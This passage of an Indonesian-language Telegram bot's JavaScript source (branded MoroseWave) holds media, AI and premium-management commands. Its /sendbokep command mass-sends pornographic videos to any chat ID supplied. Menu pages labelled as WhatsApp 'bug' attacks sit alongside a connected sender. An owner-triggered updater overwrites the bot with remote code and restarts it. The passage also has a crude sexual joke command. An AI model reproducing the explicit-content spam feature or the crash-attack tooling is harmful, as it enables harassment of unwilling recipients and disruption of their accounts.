    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    console.error("FixCode Error:", err);
    ctx.reply("⚠️ Terjadi kesalahan waktu memperbaiki kode.");
  }
});

const tiktokCache = new Map();

bot.command("tiktoksearch", async (ctx) => {
    const userId = ctx.from.id;

    try {
        const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

        if (!text) {
            return ctx.reply(
                "🪧 Masukkan kata kunci!\nContoh: `/tiktoksearch epep`",
                { parse_mode: "Markdown", reply_to_message_id: ctx.message.message_id }
            );
        }

        const loadingMsg = await ctx.reply("⏳ SEARCHING VIDEO TIKTOK...");

        const searchUrl =
            `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(text)}&count=5`;

        const res = await axios.get(searchUrl, { timeout: 20000 });
        const data = res.data;

        const videos =
            data?.data?.videos ||
            data?.data?.list ||
            data?.data?.aweme_list ||
            data?.data ||
            [];

        if (!Array.isArray(videos) || videos.length === 0) {
            await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});
            return ctx.reply("⚠️ Tidak ada hasil ditemukan.");
        }

        const topVideos = videos.slice(0, 5);
        const uniqueKey = Math.random().toString(36).slice(2, 10);

        tiktokCache.set(uniqueKey, {
            data: topVideos,
            expire: Date.now() + (10 * 60 * 1000)
        });

        await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});

        const { Markup } = require('telegraf');
        const buttons = topVideos.map((v, i) =>
            [Markup.button.callback(
                `${i + 1}. ${(v.title || "Tanpa Judul").slice(0, 30)}`,
                `tt_${uniqueKey}_${i}_${userId}`
            )]
        );

        await ctx.reply(
            `📌 Ditemukan ${topVideos.length} hasil untuk:\n${text}\n\nPilih video:`,
            Markup.inlineKeyboard(buttons)
        );

    } catch (err) {
        console.error("❌ TikTok Search Error:", err.message);
        ctx.reply("⚠️ Gagal mengambil hasil pencarian TikTok.");
    }
});

bot.action(/tt_(.+)/, async (ctx) => {
    try {
        const data = ctx.match[1];
        const [cacheKey, index, userId] = data.split("_");

        if (ctx.from.id != userId) {
            return ctx.answerCbQuery("⚠️ Ini bukan tombol kamu!", { show_alert: true });
        }

        const cachedObj = tiktokCache.get(cacheKey);
        if (!cachedObj) {
            return ctx.answerCbQuery("⚠️ Cache expired!", { show_alert: true });
        }

        const v = cachedObj.data[index];
        if (!v) {
            return ctx.answerCbQuery("⚠️ Data tidak valid!", { show_alert: true });
        }

        await ctx.answerCbQuery();

        await ctx.deleteMessage().catch(() => {});
        await ctx.reply("⏳ MENGUNDUH VIDEO...");

        const author =
            v.author?.unique_id ||
            v.author?.nickname ||
            v.user?.unique_id ||
            "unknown";

        const videoId =
            v.video_id ||
            v.id ||
            v.aweme_id ||
            v.short_id ||
            v.video?.id;

        if (!videoId) {
            return ctx.reply("⚠️ ID video tidak valid.");
        }

        const tiktokUrl = `https://www.tiktok.com/@${author}/video/${videoId}`;

        const res = await axios.post(
            "https://www.tikwm.com/api/",
            `url=${encodeURIComponent(tiktokUrl)}`,
            {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                timeout: 30000
            }
        );

        const result = res.data;

        if (!result || result.code !== 0 || !result.data) {
            throw new Error("Video tidak valid");
        }

        const vid = result.data;

        const videoUrl =
            vid.play ||
            vid.hdplay ||
            vid.wmplay ||
            vid.play_addr;

        if (!videoUrl) {
            return ctx.reply("⚠️ Link video tidak ditemukan.");
        }

        const caption =
`☀ MoroseWave Searching  
Video : *${(vid.title || "Video TikTok").slice(0, 80)}*  
Author : @${vid.author?.unique_id || "unknown"}  
Likes : ${vid.digg_count || 0}  
Comment : ${vid.comment_count || 0}  
[🌐 Lihat di TikTok](${tiktokUrl})`;

        try {
            await ctx.replyWithVideo(videoUrl, {
                caption,
                parse_mode: "Markdown"
            });
        } catch {
            const video = await axios.get(videoUrl, {
                responseType: "arraybuffer",
                timeout: 30000
            });

            await ctx.replyWithVideo(
                { source: Buffer.from(video.data) },
                {
                    caption,
                    parse_mode: "Markdown"
                }
            );
        }

        tiktokCache.delete(cacheKey);

    } catch (err) {
        console.error("❌ Callback Error:", err.message);
    }
});

bot.command("cekidgroup", async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    // Cek koneksi WhatsApp
    if (sessions.size === 0) {
      return ctx.reply("❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    // Ambil semua grup yang diikuti oleh bot
    const groups = await sock.groupFetchAllParticipating();
    const groupEntries = Object.values(groups);

    if (groupEntries.length === 0) {
      return ctx.reply("❌ Bot belum join grup mana pun");
    }

    // Buat daftar grup dengan format HTML
    let text = `<b>📋 DAFTAR ID GRUP WHATSAPP</b>\n\n`;
    let no = 1;
    for (const group of groupEntries) {
      text +=
        `<b>${no}.</b> ${group.subject}\n` +
        `ID: <code>${group.id}</code>\n\n`;
      no++;
    }

    // Kirim pesan dengan HTML
    await ctx.reply(text, { parse_mode: "HTML" });
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal mengambil data grup");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });

  try {
    await ctx.reply(" Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("cekkhodam", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");

    if (!text) {
        return ctx.reply("Nama nya mana yang mau di cek khodam nya");
    }

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const hasil = `
╭━━━━°「 *Khodam ${text}* 」°
┃
┊• Nama : ${text}
┊• Khodam : ${pickRandom([
            'Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa',
            'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana',
            'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet',
            'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani',
            'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa',
            'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Gyzen Palembang',
            'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang',
            'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung',
            'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar',
            'Burung Hantu', 'Ikan Cupang'
        ])}
┊• Mendampingi dari : ${pickRandom([
            '1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'dari lahir'
        ])}
┃• Expired : ${pickRandom([
            '2024', '2025', '2026', '2027', '2028', '2029', '2030', '2031', '2032', '2033', '2034', '2035'
        ])}
╰═┅═━––––––๑`;

    ctx.reply(hasil);
});

bot.command("cekkontol", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");

    if (!text) {
        return ctx.reply("Nama nya mana yang mau di cek kontol nya");
    }

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const hasil = `
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┊• Kontol : ${pickRandom(['ih item', 'Belang wkwk', 'Muluss', 'Putih Mulus', 'Black Doff', 'Pink wow', 'Item Glossy'])}
┊• True : ${pickRandom(['perjaka', 'ga perjaka', 'udah pernah dimasukin', 'masih ori', 'jumbo'])}
┊• jembut : ${pickRandom(['lebat', 'ada sedikit', 'gada jembut', 'tipis', 'muluss'])}
┊• ukuran : ${pickRandom(['1cm', '2cm', '3cm', '4cm', '5cm', '20cm', '45cm', '50cm', '90meter', '150meter', '5km', 'gak normal'])}
╰═┅═━––––––๑`;

    ctx.reply(hasil);
});

bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /tourl ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("🕑 Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

// ======================
// AUTO UPDATE SYSTEM
// ======================
const UPDATE_URL = "https://raw.githubusercontent.com/dbmolo/sekelipmolo/refs/heads/main/index.js";
const UPDATE_FILE_PATH = "./index.js"; 

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

// ======================
// ACTION UPDATE (LANGSUNG DARI TOMBOL)
// ======================
bot.action('update_now', async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Akses hanya untuk pemilik");
  }

  await ctx.editMessageCaption(`
<pre><code class="language-javascript">
⏳ Auto Update Script...
Mohon tunggu.
</code></pre>`, { parse_mode: "HTML" });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.editMessageCaption(`
<pre><code class="language-javascript">
✅ Update berhasil!
♻ Restarting bot...
</code></pre>`, { parse_mode: "HTML" });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.editMessageCaption(`
<pre><code class="language-javascript">
❌ Gagal update.
Reason: ${String(e.message || e)}
</code></pre>`, { parse_mode: "HTML" });
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

const PREM_GROUP_FILE = "./grup.json";

function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

const PROTECTED_IDS = new Set([
  "1550001633",
  "8035037851",
]);

const videoList = [
  "https://files.catbox.moe/kusho1.jpg",
  "https://files.catbox.moe/85mjwm.mp4",
  "https://files.catbox.moe/fzzhjm.jpg",
  "https://files.catbox.moe/ec28m8.mp4",
  "https://files.catbox.moe/n3ebuz.mp4",
  "https://files.catbox.moe/qhr4fl.jpg",
  "https://files.catbox.moe/zqaszb.mp4",
  "https://files.catbox.moe/34aa39.mp4",
  "https://files.catbox.moe/dmbizk.mp4",
  "https://files.catbox.moe/wmda7z.mp4",
  "https://files.catbox.moe/kwb2m2.jpg",
  "https://files.catbox.moe/8xye1k.jpg",
  "https://files.catbox.moe/y1osro.mp4",
  "https://files.catbox.moe/2mowo7.jpg",
  "https://files.catbox.moe/o1ipxw.mp4",
  "https://files.catbox.moe/i6335n.mp4",
  "https://files.catbox.moe/73rjgf.jpg",
  "https://files.catbox.moe/3re1pn.jpg",
  "https://files.catbox.moe/sclrvo.jpg",
  "https://files.catbox.moe/l3sra9.jpg",
  "https://files.catbox.moe/vxe9zl.mp4",
  "https://files.catbox.moe/9vtw1i.jpg",
  "https://files.catbox.moe/o1sq2k.mp4",
  "https://files.catbox.moe/y91pkz.jpg",
  "https://files.catbox.moe/0hies4.jpg",
  "https://files.catbox.moe/hnbks1.jpg",
  "https://files.catbox.moe/1a78ht.mp4",
  "https://files.catbox.moe/htcdyl.jpg",
  "https://files.catbox.moe/iajl3r.mp4",
  "https://files.catbox.moe/pamcr7.jpg",
  "https://files.catbox.moe/eti8qi.mp4",
  "https://files.catbox.moe/wgj8vl.mp4",
  "https://files.catbox.moe/83fd5h.mp4",
  "https://files.catbox.moe/k1w8sw.jpg",
  "https://files.catbox.moe/tdqof8.jpg",
  "https://files.catbox.moe/6di4hn.mp4",
  "https://files.catbox.moe/0eisok.mp4",
  "https://files.catbox.moe/e5zkcl.jpg",
];

bot.command("sendbokep", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  const targetId = args[0];
  const jumlah = parseInt(args[1]) || 1;

  if (!targetId) {
    return ctx.reply("❌ Format: /sendbokep <chat_id> [jumlah]");
  }

  if (PROTECTED_IDS.has(String(targetId))) {
    return ctx.replyWithHTML(
  `⛔ Pengiriman diblokir: ID <code>${targetId}</code> termasuk dalam daftar terlindungi (developer).`
  );
  }
  
  await ctx.replyWithHTML(
  `Mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );

  for (let i = 0; i < jumlah; i++) {
    const randomVideo =
      videoList[Math.floor(Math.random() * videoList.length)];

    try {
      await ctx.telegram.sendVideo(targetId, randomVideo);
    } catch (err) {
      console.error("Gagal kirim video:", err.message);

      return ctx.replyWithHTML(
  `❌ Gagal mengirim video ke ID <code>${targetId}</code>: ${err.message}`
  );
    }
  }

  await ctx.replyWithHTML(
    `✅ Berhasil mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );
});

const activePolls = {};

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
        if (ctx.from.id != ownerID && !isAdmin(ctx.from.id)) {
            return ctx.reply("❌ ☇ Akses hanya untuk pemilik dan admin"); 
        }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const userWarna = new Map();

// ======================
// WARNA & ICON
// ======================
function getStyle(warna) {
    if (warna === 'merah') return 'danger';
    if (warna === 'biru') return 'primary';
    if (warna === 'hijau') return 'success';
    return 'success';
}

function getDiskoStyle() {
    const random = Math.floor(Math.random() * 3);
    if (random === 0) return 'danger';
    if (random === 1) return 'primary';
    return 'success';
}

const iconIdsList = [
    "5316556616319905664", "5440703719752608257", "5438166923089029724",
    "5438191043625364502", "5449806649533411582", "5330237710655306682",
    "5285084633573110315", "5244968767150109583", "5208464633215611044",
    "5260450573768990626", "5334818215967076232", "6309915906877165527",
    "6086730808968614780", "6089217174126203362", "6086946867298439895",
    "6089124398537642497", "6088971806939550947", "6093818260921258328",
    "6089079808187174973", "6309611273436793918", "6307512258494730630",
    "6307696237713822796", "5256217926448468100", "5440805291434192517",
    "5438181757906069988", "5334738840676475461", "5220037761897085778",
    "5294397698923832095",
    "5413879192267805083", "5231200819986047254", "6028551194861899805",
    "5210956306952758910", "5217822164362739968"
];

function getRandomIconId() {
    return iconIdsList[Math.floor(Math.random() * iconIdsList.length)];
}

function createButton(text, callback, funcKey, warna) {
    let style = 'success';
    if (warna === 'disko') {
        style = getDiskoStyle();
    } else {
        style = getStyle(warna);
    }
    const btn = { text, callback_data: callback, style };
    btn.icon_custom_emoji_id = getRandomIconId();
    return btn;
}

function createUrlButton(text, url, funcKey, warna) {
    let style = 'success';
    if (warna === 'disko') {
        style = getDiskoStyle();
    } else {
        style = getStyle(warna);
    }
    const btn = { text, url, style };
    btn.icon_custom_emoji_id = getRandomIconId();
    return btn;
}

// ======================
// MENU FUNCTIONS
// ======================
function getMenuHome(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_information", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_homecontrols", 'nav', warna)
        ],
        [
            createUrlButton("𝗧𝗵𝗲 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿𝘀", "https://t.me/Luctadvorisme", 'owner', warna)
        ]
    ];
}

function getMenuControls(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_home", 'nav', warna),
            createButton("HOME", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_hometoolss", 'nav', warna)
        ],
        [
            createButton("𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝘀", "menu_controls", 'nav', warna)
        ]
    ];
}

function getMenuToolss(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_homecontrols", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_homebugs", 'nav', warna)
        ],
        [
            createButton("𝗧𝗼𝗼𝗹𝘀", "menu_toolss", 'nav', warna)
        ]
    ];
}

function getMenuBug(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_hometoolss", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_hometqto", 'nav', warna)
        ],
        [
            createButton("𝗠𝘂𝗿𝗯𝘂𝗴", "menu_bug", 'nav', warna),
            createButton("𝗚𝗿𝗼𝘂𝗽 𝗕𝘂𝗴", "menu_bug3", 'nav', warna),
            createButton("𝗧𝗿𝗮𝘀𝗵 𝗕𝘂𝗴", "menu_bug2", 'nav', warna)
        ]
    ];
}

function getMenuTqto(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_homebugs", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_information", 'nav', warna)
        ],
        [
            createButton("𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼", "menu_tqto", 'nav', warna)
        ]
    ];
}

function getMenuInformation(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_tqto", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_home", 'nav', warna)
        ],
        [
            createButton("𝗠𝗘𝗡𝗨 𝗣𝗥𝗜𝗖𝗘", "menu_price", 'nav', warna)
        ]
    ];
}

function getMenuPrice(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_information", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_home", 'nav', warna)
        ],
        [
            createUrlButton("𝗕𝗨𝗬", "https://t.me/Luctadvorisme", 'owner', warna)
        ]
    ];
}

function getMenuCaption(premiumStatus, name, userId, senderStatus, runtimeStatus, page) {
    return `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

[ STATUS ]
  Premium: ${premiumStatus}
  Name: ${name} (${userId})
  Sender: ${senderStatus}
  Runtime: ${runtimeStatus}
  Guard: Active

[ PAGE ${page}/6 ]
</code></pre>`;
}

function getOpeningMenuCaption(username, userId, senderStatus, runtime) {
    return `
<pre><code class="language-javascript">
[ MOROSEWAVE ]
──────────────────
Bukan sekadar gelombang,
tapi gema dari keheningan yang berbicara.
Di antara kode dan sunyi,
kita menari di tepi realitas.

──────────────────
 Auto-Update : Enabled
 System      : Online & Active
──────────────────
"Terkadang, kehampaan adalah ruang
di mana kita menemukan jawaban."
</code></pre>`;
}

// ======================
// START MENU (PILIH WARNA)
// ======================
bot.start(async (ctx) => {
    const loadingMessage = await ctx.reply("🤖 <b>MoroseWave Initializing...</b>", { parse_mode: "HTML" });
    const loadingFrames = [
        { text: "🌊 <b>Wave Detecting...</b>", delay: 300 },
        { text: "🕳️ <b>Entering the Void...</b>", delay: 300 },
        { text: "🕸️ <b>Mapping the Infinity...</b>", delay: 300 },
        { text: "🔥 <b>Igniting The Core...</b>", delay: 300 },
        { text: "🌒 <b>MoroseWave Present</b>", delay: 300 },
        { text: "🌑 <b>Everything is Nothing.</b>", delay: 500 }
    ];
    for (const frame of loadingFrames) {
        try {
